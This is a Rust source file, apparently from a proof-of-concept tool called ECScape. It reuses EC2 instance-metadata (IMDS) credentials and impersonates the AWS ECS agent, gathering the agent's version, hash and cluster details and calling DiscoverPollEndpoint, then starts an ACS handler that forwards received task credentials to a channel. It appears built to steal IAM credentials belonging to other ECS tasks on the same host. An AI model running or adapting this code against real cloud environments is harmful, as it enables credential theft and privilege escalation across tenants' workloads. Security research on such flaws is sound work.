use crate::{
    credentials_reactors::ECScapeCredentials,
    ecs_agent_metadata::ECSAgentMetadata,
    imds_metadata::IMDSMetadata,
    protocols::{acs::handler::ACSHandler, protocol_handler::ProtocolHandler},
};
use anyhow::Result;
use aws_credential_types::Credentials;
use aws_sdk_ecs::{Client as EcsClient, config::SharedCredentialsProvider};
use aws_types::{SdkConfig, region::Region};
use tokio::{select, sync::broadcast::Sender};

pub struct ECScape {
    imds_metadata: IMDSMetadata,
    ecs_agent_metadata: ECSAgentMetadata,
}

impl ECScape {
    pub async fn try_new(imds_metadata: IMDSMetadata) -> Result<Self> {
        let ecs_agent_metadata = ECSAgentMetadata::try_new(&imds_metadata.local_ip).await?;

        Ok(Self {
            imds_metadata,
            ecs_agent_metadata,
        })
    }

    pub async fn start(&self, credentials_sender: Sender<ECScapeCredentials>) -> Result<()> {
        let credentials = Credentials::new(
            self.imds_metadata.aws_access_key_id.as_str(),
            self.imds_metadata.aws_access_secret_key.as_str(),
            Some(self.imds_metadata.aws_access_token.clone()),
            None,
            "IMDS",
        );

        let credentials_provider = SharedCredentialsProvider::new(credentials.clone());

        let region = Region::new(self.ecs_agent_metadata.region.clone());
        let sdk_config = SdkConfig::builder()
            .credentials_provider(credentials_provider)
            .region(region)
            .build();

        let ecs_client = EcsClient::new(&sdk_config);

        let discover_poll_endpoint_output = ecs_client
            .discover_poll_endpoint()
            .cluster(&self.ecs_agent_metadata.cluster_arn)
            .container_instance(self.ecs_agent_metadata.container_instance_arn.as_str())
            .send()
            .await?;

        // Create ACS handler
        let acs_handler = ACSHandler::new(
            credentials_sender,
            credentials.clone(),
            discover_poll_endpoint_output.clone(),
            self.ecs_agent_metadata.region.clone(),
            self.ecs_agent_metadata.cluster_arn.clone(),
            self.ecs_agent_metadata.container_instance_arn.clone(),
            self.ecs_agent_metadata.ecs_agent_version.clone(),
            self.ecs_agent_metadata.ecs_agent_hash.clone(),
        );

        // // Create TCS handler
        // let tcs_handler = TCSHandler::new(
        //     credentials,
        //     discover_poll_endpoint_output,
        //     self.ecs_agent_metadata.region.clone(),
        //     self.ecs_agent_metadata.cluster_arn.clone(),
        //     self.container_instance_registrator
        //         .container_instance_arn()
        //         .to_string(),
        //     self.ecs_agent_metadata.ecs_agent_version.clone(),
        //     self.ecs_agent_metadata.ecs_agent_hash.clone(),
        // );

        select! {
            res = acs_handler.start() => res,
            // res = tcs_handler.start() => res,
        }
    }
}
